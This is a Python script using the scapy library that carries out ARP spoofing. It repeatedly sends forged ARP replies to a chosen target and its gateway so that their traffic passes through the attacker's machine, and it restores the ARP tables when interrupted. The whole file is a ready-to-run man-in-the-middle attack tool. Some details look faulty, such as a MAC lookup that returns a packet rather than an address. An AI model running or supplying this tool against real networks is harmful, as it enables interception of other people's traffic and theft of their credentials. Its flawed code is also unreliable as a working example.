import scapy.all as scapy
import time
import argparse
import sys

def get_options():
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", help="Specify the target IP", dest="target", action="store", type=str)
        parser.add_argument("-g", "--gateway", help="Specify the gateway or the router's IP", dest="gateway", action="store", type=str)
        options = parser.parse_args()
        if not options.target and not options.gateway:
            parser.print_help()
            sys.exit(1)
        return options
    except Exception as err:
        print(str(err))

def Restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    pkt_1 = scapy.ARP(op=2, hwdst=target_mac, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac)
    scapy.send(pkt_1, verbose=False)
    pkt_2 = scapy.ARP(op=2, hwdst=gateway_mac, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac)
    scapy.send(pkt_2, verbose=False)

def get_mac(ip):
    arp_pkt = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_pkt_broadcast = broadcast / arp_pkt
    ans = scapy.srp(arp_pkt_broadcast, verbose=False)[0]
    return ans[0][1]

def Spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    pkt = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=target_ip)
    scapy.send(pkt, verbose=False)

options = get_options()
target_ip = options.target
gateway_ip = options.gateway
pkt_count = 0

while 1:
    try:
        Spoof(target_ip, gateway_ip)
        Spoof(gateway_ip, target_ip)
        pkt_count = pkt_count + 2 
        print("\r[+] Packets sent: " + str(pkt_count), end="")
        time.sleep(1)
    except KeyboardInterrupt:
        print("\nCTRL + C detected. Restoring......")
        Restore(target_ip, gateway_ip)
        print("Resored ARP tables. Quiting")
        break
    except Exception as err:
        print(str(err))